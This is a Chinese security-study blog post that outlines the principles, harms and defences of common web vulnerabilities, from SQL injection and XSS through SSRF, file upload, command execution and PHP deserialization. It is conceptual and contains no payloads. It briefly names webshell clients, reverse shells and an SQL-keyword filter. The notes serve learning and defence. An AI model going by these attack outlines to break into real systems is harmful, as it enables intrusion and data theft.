<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"ttoc.xin","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"1NWCFV229B","apiKey":"89f81f113af1e49e4b5061eb680ea44d","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="学会一样东西，最重要特征就是可以把一个知识点的原理弄懂，造成一次成功注入，要注意分析源码当中导致这个漏洞的问题点，又应该如何改进与防御， 不要急于求成，慢即是快，少即是多 好记性不如烂笔头，一些知识点还是要多写几遍来记住，不是简单ctrl+c&#x2F;+v就学到了，上机自己练习，打靶场，永远是最有效的方法，一定学会文章和实际操作密切结合，坚持做笔记 学东西就只当学一次，一次学到最好，不要囫囵吞枣  思路绝">
<meta property="og:type" content="article">
<meta property="og:title" content="WEB学习">
<meta property="og:url" content="https://ttoc.xin/Web-study/index.html">
<meta property="og:site_name" content="Ttoc&#39;s blog">
<meta property="og:description" content="学会一样东西，最重要特征就是可以把一个知识点的原理弄懂，造成一次成功注入，要注意分析源码当中导致这个漏洞的问题点，又应该如何改进与防御， 不要急于求成，慢即是快，少即是多 好记性不如烂笔头，一些知识点还是要多写几遍来记住，不是简单ctrl+c&#x2F;+v就学到了，上机自己练习，打靶场，永远是最有效的方法，一定学会文章和实际操作密切结合，坚持做笔记 学东西就只当学一次，一次学到最好，不要囫囵吞枣  思路绝">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20230803154603968.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20220802103546644.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20220802103603770.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20230806195837908.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20220909230928678.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20220909231009396.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20230803154919325.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20230803154936817.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20230803154959716.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20230803155010542.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20230803155021564.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20230803155036805.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20221015095141092.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20221015095555062.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20221015094930498.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20220815234910350.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/20200226180218842.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20230803155611860.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20220801143739625.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20230803154754765.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20230803154806812.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20230803165104978.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20220926223728694.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20220926223749908.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20230502195813375.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20220927091524021.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20220927091556911.png">
<meta property="og:image" content="https://image.3001.net/images/20220311/1646988663_622b0d779748192aba6f7.png!small">
<meta property="og:image" content="https://image.3001.net/images/20220311/1646988665_622b0d79304714550f427.png!small">
<meta property="og:image" content="https://image.3001.net/images/20220311/1646988666_622b0d7a2a04733d2da9c.png!small">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20220903123146044.png">
<meta property="og:image" content="https://ttoc.xin/Web-study/image-20220903123047693.png">
<meta property="og:image" content="https://pic3.zhimg.com/80/v2-a24770cd727d793d93abd89d5025ad41_hd.jpg">
<meta property="og:image" content="https://pic4.zhimg.com/80/v2-bddead1f721c42eed678d9db9527c0e7_hd.jpg">
<meta property="article:published_time" content="2022-05-28T08:01:29.902Z">
<meta property="article:modified_time" content="2025-02-09T13:55:23.377Z">
<meta property="article:author" content="Ttoc">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ttoc.xin/Web-study/image-20230803154603968.png">

<link rel="canonical" href="https://ttoc.xin/Web-study/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>WEB学习 | Ttoc's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style><link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Ttoc's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">必须从过去的错误学习教训，而非依赖过去的成功。</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://ttoc.xin/Web-study/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Ttoc">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ttoc's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          WEB学习
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-28 16:01:29" itemprop="dateCreated datePublished" datetime="2022-05-28T16:01:29+08:00">2022-05-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-02-09 21:55:23" itemprop="dateModified" datetime="2025-02-09T21:55:23+08:00">2025-02-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">网络安全学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><code>学会一样东西，最重要特征就是可以把一个知识点的原理弄懂，造成一次成功注入，要注意分析源码当中导致这个漏洞的问题点，又应该如何改进与防御，</code></p>
<p><code>不要急于求成，慢即是快，少即是多</code></p>
<p><code>好记性不如烂笔头，一些知识点还是要多写几遍来记住，不是简单ctrl+c/+v就学到了，上机自己练习，打靶场，永远是最有效的方法，一定学会文章和实际操作密切结合，坚持做笔记</code></p>
<p><code>学东西就只当学一次，一次学到最好，不要囫囵吞枣</code></p>
<hr>
<p>思路绝对不要被局限！！！</p>
<span id="more"></span>

<h1 id="基础漏洞知识"><a href="#基础漏洞知识" class="headerlink" title="基础漏洞知识"></a>基础漏洞知识</h1><blockquote>
<p>–转载原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/c_programj/article/details/117452836">https://blog.csdn.net/c_programj/article/details/117452836</a></p>
</blockquote>
<h2 id="一、sql漏洞篇"><a href="#一、sql漏洞篇" class="headerlink" title="一、sql漏洞篇"></a>一、sql漏洞篇</h2><blockquote>
<p><a href="#%E4%B8%80%E3%80%81sql">sql漏洞知识点记录</a></p>
</blockquote>
<h3 id="1-sql漏洞原理"><a href="#1-sql漏洞原理" class="headerlink" title="1.sql漏洞原理"></a>1.sql漏洞原理</h3><p>指web应用程序<u><strong>对用户输入的数据合法性没有判断</strong></u>，导致攻击者可以<u><strong>构造不同的sql语句来对数据库数据库的操作</strong></u>。（web应用程序对用户输入的数据没有进行过滤，或者过滤不严，就把sql语句带进数据库中进行查询）。</p>
<blockquote>
<p>Sql注入漏洞的产生需要满足两个条件：<br>①参数用户可控：<u><strong>前端传给后端的参数内容是用户可以控制的</strong></u>。<br>②<u><strong>参数代入数据库查询</strong></u>：传入的参数拼接到sql语句，且带入数据库查询。</p>
</blockquote>
<h3 id="2-危害"><a href="#2-危害" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①数据库信息泄漏：数据库中存放的<u><strong>用户的隐私信息的泄露</strong></u>。<br>②网页篡改：通过操作数据库对特定网页进行篡改。<br>③网站被挂马，传播恶意软件：<u><strong>修改数据库一些字段的值，嵌入网马链接</strong></u>，进行挂马攻击。<br>④数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>⑤服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。<br>⑥破坏硬盘数据，瘫痪全系统。</p>
</blockquote>
<h3 id="3-防御"><a href="#3-防御" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①<u><strong>过滤危险字符</strong></u>：例如，采用正则表达式匹配union、sleep、load_file等关键字，如果匹配到，则退出程序。<br>②使用预编译语句：使用PDO预编译语句，需要注意，不要将变量直接拼接到PDO语句中，而是使用占位符进行数据库的增加、删除、修改、查询。<br>③特殊字符转义、使用严格的数据类型。</p>
</blockquote>
<h2 id="二、xss漏洞篇"><a href="#二、xss漏洞篇" class="headerlink" title="二、xss漏洞篇"></a>二、xss漏洞篇</h2><h3 id="1-xss漏洞原理"><a href="#1-xss漏洞原理" class="headerlink" title="1.xss漏洞原理"></a>1.xss漏洞原理</h3><p>恶意攻击者<u><strong>往Web页面里嵌入脚本代码</strong></u>（<u><strong>通常是JavaScript编写的恶意代码</strong></u>），当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。（恶意攻击者<u><strong>利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码</strong></u>，嵌入到web页面中去。）</p>
<h3 id="2-危害-1"><a href="#2-危害-1" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①盗取用户Cookie。<br>②修改网页内容。<br>③网站挂马。<br>④利用网站重定向。<br>⑤XSS蠕虫。</p>
</blockquote>
<h3 id="3-防御-1"><a href="#3-防御-1" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①过滤输入的数据：包括” ’ ”、”&lt;”、“&lt;”、“&gt;”、“on”等非法字符。<br>②对输出到页面的数据进行相应的编码转换，包括html实体编码、javascript编码等。</p>
</blockquote>
<h2 id="三、csrf漏洞篇"><a href="#三、csrf漏洞篇" class="headerlink" title="三、csrf漏洞篇"></a>三、csrf漏洞篇</h2><h3 id="1-csrf漏洞原理"><a href="#1-csrf漏洞原理" class="headerlink" title="1.csrf漏洞原理"></a>1.csrf漏洞原理</h3><p>因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，<u><strong>没有校验表单token或者http请求头中的referer值</strong></u>（如果您<u><strong>在网页1，点击一个链接到网页2</strong></u>，当浏览器<u><strong>请求网页2时，网页1的URL就会包含在 Referer 头信息</strong></u>中），从而<u><strong>导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为</strong></u>。</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803154603968.png"><img src="/Web-study/image-20230803154603968.png" alt="image-20230803154603968"></a></p>
<p>Csrf攻击过程两个重点：</p>
<blockquote>
<p>①目标用户<u><strong>已经登录了网站</strong></u>，<u><strong>能够执行网站的功能</strong></u>。<br>②目标用户<u><strong>访问了攻击者构造的URL</strong></u>。</p>
</blockquote>
<h3 id="2-危害-2"><a href="#2-危害-2" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①伪造HTTP请求进行未授权操作。<br>②篡改、盗取目标网站上的重要用户数据。<br>③未经允许执行对用户名誉或者资产有害的操作，比如：散播不良信息、进行消费等。<br>④如果通过使用社工等方式攻击网站管理员、会危害网站本身的安全性。<br>⑤作为其他攻击向量的辅助攻击手法，必须配合XSS<br>⑥传播CSRF蠕虫</p>
</blockquote>
<h3 id="3-防御-2"><a href="#3-防御-2" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①验证请求的<u><strong><code>referer</code></strong></u>值，如果referer是以自己的网站开头的域名，则说明该请求来自网站自己，是合法的。<u><strong>如果referer是其他网站域名或空白，就有可能是csrf攻击，那么服务器拒绝该请求</strong></u>，但是此方法存在被绕过的可能【<u><strong>brupsuite可以抓包修改referer从而绕过前端过滤</strong></u>】。<br>②csrf攻击之所以能成功，是因为<u><strong>攻击者伪造用户的请求</strong></u>，所以抵御csrf的关键在于：在<u><strong>请求中放入攻击者不能伪造的请求</strong></u>，例如，可以在HTTP请求中加入一个随机产生的token，并在服务器端<u><strong>验证token</strong></u>【<u><strong>类似于验证码</strong></u>】，如果请求中没有token或者token内容不正确，则认为请求可能是csrf攻击，从而拒绝该请求。</p>
</blockquote>
<h2 id="四、xxe漏洞篇"><a href="#四、xxe漏洞篇" class="headerlink" title="四、xxe漏洞篇"></a>四、xxe漏洞篇</h2><h3 id="1-xxe漏洞原理"><a href="#1-xxe漏洞原理" class="headerlink" title="1.xxe漏洞原理"></a>1.xxe漏洞原理</h3><p>XML 外部实体攻击是针对解析 XML 输入的应用程序的一种攻击。当<strong>包含对外部实体的引用的 XML 输入由弱配置的 XML 解析器处理</strong>时，就会发生这种攻击。这种攻击可能导致<strong>机密数据泄露、拒绝服务、服务器端请求伪造、从解析器所在机器的角度进行端口扫描</strong>等系统影响。</p>
<p>攻击可能包括使用系统标识符中的 <code>file: 方案或相对路径公开本地文件</code>，这些文件<strong>可能包含敏感数据，例如密码或私人用户数据</strong>。由于<strong>攻击发生与处理 XML 文档的应用程序相关</strong>，因此<strong>攻击者可能会使用此受信任的应用程序转向其他内部系统</strong>，可能通过 http(s) 请求泄露其他内部内容或<strong>对任何未受保护的内部服务发起 CSRF 攻击</strong>。在某些情况下，易受客户端内存损坏问题影响的 XML 处理器库<strong>可能会通过解除对恶意 URI 的引用而被利用</strong>，<strong>从而可能允许在应用程序帐户下执行任意代码</strong>。其他攻击可以访问可能不会停止返回数据的本地资源，</p>
<p>一般来说，我们可以区分以下几种 XXE 攻击：</p>
<blockquote>
<ul>
<li>典型注入：在这种情况下，外部实体包含在本地 DTD 中</li>
<li>盲注：响应中没有显示输出和&#x2F;或错误</li>
<li>报错注入：尝试在错误消息中获取资源的内容</li>
</ul>
</blockquote>
<p>XML文档结构包括<u><strong>XML声明、DTD文档类型定义（可选）、文档元素</strong></u>。</p>
<h3 id="2-危害-3"><a href="#2-危害-3" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①读取任意文件。<br>②执行系统命令。<br>③探测内网端口。<br>④攻击内网网站。</p>
</blockquote>
<h3 id="3-防御-3"><a href="#3-防御-3" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①禁止使用<u><strong>外部实体</strong></u>，例如：<br>PHP：libxml_disable_entity_loader(true)<br>②过滤用户提交的xml数据，防止出现非法内容。</p>
</blockquote>
<h2 id="五、ssrf漏洞篇"><a href="#五、ssrf漏洞篇" class="headerlink" title="五、ssrf漏洞篇"></a>五、ssrf漏洞篇</h2><h3 id="1-ssrf漏洞原理"><a href="#1-ssrf漏洞原理" class="headerlink" title="1.ssrf漏洞原理"></a>1.ssrf漏洞原理</h3><p>大都是由于<u><strong>服务器提供了从其他服务器应用获取数据的功能</strong></u>且<u><strong>没有对目标地址做过滤与限制</strong></u><strong>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</strong><u><strong>利用的是服务端的请求伪造</strong></u>。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220802103546644.png"><img src="/Web-study/image-20220802103546644.png" alt="image-20220802103546644"></a></p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220802103603770.png"><img src="/Web-study/image-20220802103603770.png" alt="image-20220802103603770"></a></p>
<h3 id="2-危害-4"><a href="#2-危害-4" class="headerlink" title="2.危害"></a>2.危害</h3><p>攻击者就可以<u><strong>利用该漏洞绕过防火墙等访问限制</strong></u>，进而将受感染或存在漏洞的服务器作为代理进行端口扫描，甚至是访问内部系统数据。</p>
<blockquote>
<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner 信息</p>
<p>2.攻击运行在内网或本地的应用程序</p>
<p>3.对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</p>
<p>4.攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</p>
<p>5.下载内网资源(如：利用file协议读取本地文件等)</p>
<p>6.进行跳板</p>
<p>7.无视cdn</p>
<p>8.利用Redis未授权访问，HTTP CRLF注入实现getshell</p>
</blockquote>
<h3 id="3-防御-4"><a href="#3-防御-4" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>① 限制请求的端口只能为web端口，只允许访问HTTP和HTTPS请求。<br>② 限制不能访问内网的IP，以防止对内网进行攻击。<br>③ 屏蔽返回的详细信息。<br>④ 限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等。</p>
</blockquote>
<blockquote>
<p>PHP中下面函数的使用不当会导致SSRF:</p>
<p>file_get_contents()</p>
<p>fsockopen()<br>#在PHP中fsockopen函数的作用是打开一个网络连接或者一个Unix套接字连接，其语法为“fsockopen($hostname) ”，返回值为一个文件句柄，之后可以被其他文件类函数调用</p>
<p>curl_exec()</p>
</blockquote>
<h2 id="六、文件上传漏洞篇"><a href="#六、文件上传漏洞篇" class="headerlink" title="六、文件上传漏洞篇"></a>六、文件上传漏洞篇</h2><h3 id="1-文件上传漏洞原理"><a href="#1-文件上传漏洞原理" class="headerlink" title="1.文件上传漏洞原理"></a>1.文件上传漏洞原理</h3><p>就是未对用户上传的文件进行检查和过滤，导致某些别有用心的用户上传了一些恶意代码或文件（<code>asp、php、jsp</code>等），从而控制了网站。（当文件上传时，如果服务端的脚本语言没有对上传的文件进行检查和过滤，那假如，渗透者直接上传恶意代码文件，那么就有可能直接控制整个网站，或者说以此为跳板，直接拿下服务器，这就是文件上传漏洞。）</p>
<h3 id="2-危害-5"><a href="#2-危害-5" class="headerlink" title="2.危害"></a>2.危害</h3><p><u><strong>非法用户可以利用恶意脚本文件控制整个网站，甚至控制服务器</strong></u>。这个恶意脚本文件，又称为webshell，也可将webshell脚本称为一种网页后门，webshell脚本具有很强大的功能，<u><strong>比如查看服务器目录、服务器中的文件，执行绕过命令等。</strong></u>【<strong>用蚁剑或菜刀连接上传的 php文件，输入文件中的密码</strong>】</p>
<h3 id="3-防御-5"><a href="#3-防御-5" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①通过白名单方式判断文件后缀是否合法。<br>②对上传的文件进行重命名。</p>
</blockquote>
<hr>
<h2 id="七、文件包含漏洞篇"><a href="#七、文件包含漏洞篇" class="headerlink" title="七、文件包含漏洞篇"></a>七、文件包含漏洞篇</h2><h3 id="1-文件包含漏洞原理"><a href="#1-文件包含漏洞原理" class="headerlink" title="1.文件包含漏洞原理"></a>1.文件包含漏洞原理</h3><p>开发人员将<u><strong>需要重复调用的函数写入一个文件，对该文件进行包含是产生的操作</strong></u>。这样编写代码能减少代码冗余，降低代码后期维护难度，保证网站整体风格统一：导航栏、底部footer栏等。<u><strong>文件包含函数加载的参数没有经过过滤或严格定义，可以被用户控制，包含其他恶意文件，导致了执行非预期代码</strong></u>。</p>
<h3 id="2-危害-6"><a href="#2-危害-6" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①获取敏感信息<br>②执行任意命令<br>③获取服务器权限</p>
</blockquote>
<h3 id="3-防御-6"><a href="#3-防御-6" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①建议白名单。<br>②指定访问一定的路径，再将参数拼接到路径当中。</p>
</blockquote>
<hr>
<h2 id="八、逻辑漏洞漏洞篇"><a href="#八、逻辑漏洞漏洞篇" class="headerlink" title="八、逻辑漏洞漏洞篇"></a>八、逻辑漏洞漏洞篇</h2><h3 id="1-逻辑漏洞漏洞原理"><a href="#1-逻辑漏洞漏洞原理" class="headerlink" title="1.逻辑漏洞漏洞原理"></a>1.逻辑漏洞漏洞原理</h3><p>指攻击者<u><strong>利用业务的设计缺陷，获取敏感信息或破坏业务的完整性</strong></u>。一般出现在<u><strong>密码修改、越权访问、密码找回、交易支付</strong></u>等功能处。</p>
<h3 id="2-危害-7"><a href="#2-危害-7" class="headerlink" title="2.危害"></a>2.危害</h3><p>任意密码修改、越权访问、密码任意找回、交易支付金额任意修改等</p>
<h3 id="3-防御-7"><a href="#3-防御-7" class="headerlink" title="3.防御"></a>3.防御</h3><h4 id="1-任意密码修改"><a href="#1-任意密码修改" class="headerlink" title="1.任意密码修改"></a>1.任意密码修改</h4><h4 id="2-越权访问"><a href="#2-越权访问" class="headerlink" title="2.越权访问"></a>2.越权访问</h4><p>越权访问漏洞产生<u><strong>主要原因是没有对用户的身份做判断和控制</strong></u>，防范这种漏洞时，可以通过session来控制。</p>
<p>例如，在用户登录时，将username或uid写入到<code>session</code><u><strong><code>（会话控制，Session对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的Web页之间跳转时，存储在Session对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。）</code></strong></u>中取出信息，<u><strong><code>而不是从GET或POST取出username</code></strong></u>，name此时取到的username就是没有篡改的。</p>
<hr>
<h2 id="九、命令执行漏洞篇"><a href="#九、命令执行漏洞篇" class="headerlink" title="九、命令执行漏洞篇"></a>九、命令执行漏洞篇</h2><h3 id="1-命令执行漏洞原理"><a href="#1-命令执行漏洞原理" class="headerlink" title="1.命令执行漏洞原理"></a>1.命令执行漏洞原理</h3><p>应用未对用户输入做严格的检查过滤，导致用户<u><strong>输入的参数被当成命令来执行</strong></u>。攻击者可以任意执行系统命令，属于高危漏洞之一，也属于代码执行的范畴。</p>
<h3 id="2-危害-8"><a href="#2-危害-8" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①继承web服务程序的权限去执行系统命令或读写文件。<br>②反弹shell，获得目标服务器的权限。<br>③进一步内网渗透。</p>
</blockquote>
<h3 id="3-防御-8"><a href="#3-防御-8" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①尽量不要使用命令执行函数。<br>②客户端<u><strong>提交的变量在进入执行命令函数前</strong></u>要做好<u><strong>过滤和检测</strong></u>。<br>③在<u><strong>使用动态函数之前</strong></u>，确保使用函数是<u><strong>指定的函数</strong></u>之一。<u><strong>【防止攻击者引入新函数（非网站使用的函数）执行攻击语句】</strong></u><br>④对<u><strong>php语言</strong></u>而言，<u><strong>不能完全控制的危险函数最好不要使用</strong></u>。</p>
</blockquote>
<hr>
<h2 id="十、暴力破解篇"><a href="#十、暴力破解篇" class="headerlink" title="十、暴力破解篇"></a>十、暴力破解篇</h2><h3 id="1-暴力破解原理"><a href="#1-暴力破解原理" class="headerlink" title="1.暴力破解原理"></a>1.暴力破解原理</h3><p>由于服务器端没有做限制，导致攻击者可以通过暴力手段破解所需信息，如用户名、密码、验证码等。暴力破解需要一个强大的字典，如4位数字的验证码，那么暴力破解的范围就是0000~9999，<u><strong>暴力破解的关键在于字典的大小</strong></u>。</p>
<h3 id="2-危害-9"><a href="#2-危害-9" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①用户密码被重置。<br>②敏感目录、参数被枚举。<br>③用户订单被枚举。</p>
</blockquote>
<h3 id="3-防御-9"><a href="#3-防御-9" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>① 如果<u><strong>用户登录次数超过设置的阈值</strong></u>，则<u><strong>锁定账号</strong></u>。<br>② 如果<u><strong>某个IP登陆次数超过设置的阈值，则锁定IP</strong></u>。但<u><em><strong>存在一个问题</strong></em></u>，如果<u><strong>多个用户使用的是同一个IP，则会造成其他用户也不能登录。</strong></u></p>
</blockquote>
<hr>
<h2 id="十一、Deserialization-Vulnerabilities（PHP）"><a href="#十一、Deserialization-Vulnerabilities（PHP）" class="headerlink" title="十一、Deserialization Vulnerabilities（PHP）"></a>十一、Deserialization Vulnerabilities（PHP）</h2><h3 id="1-Deserialization-Vulnerabilities漏洞原理"><a href="#1-Deserialization-Vulnerabilities漏洞原理" class="headerlink" title="1.Deserialization Vulnerabilities漏洞原理"></a>1.Deserialization Vulnerabilities漏洞原理</h3><p>PHP反序列化漏洞也叫PHP对象注入，是一个非常常见的漏洞，这种类型的漏洞虽然有些难以利用，但一旦利用成功就会造成非常危险的后果。</p>
